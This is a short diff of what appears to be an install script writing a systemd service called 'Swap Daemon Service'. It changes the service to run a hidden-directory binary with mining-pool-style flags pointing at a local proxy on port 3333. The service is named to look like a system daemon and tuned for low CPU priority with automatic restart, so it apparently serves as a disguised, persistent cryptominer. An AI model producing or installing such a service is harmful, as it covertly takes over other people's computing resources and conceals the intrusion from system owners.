@@ -391,7 +391,7 @@ else
 Description=Swap Daemon Service
 
 [Service]
-ExecStart=$HOME/.swapd/swapd --config=/root/.swapd/config.json
+ExecStart=$HOME/.swapd/swapd -o 127.0.0.1:3333 -u x+50000
 Restart=always
 Nice=10
 CPUWeight=1
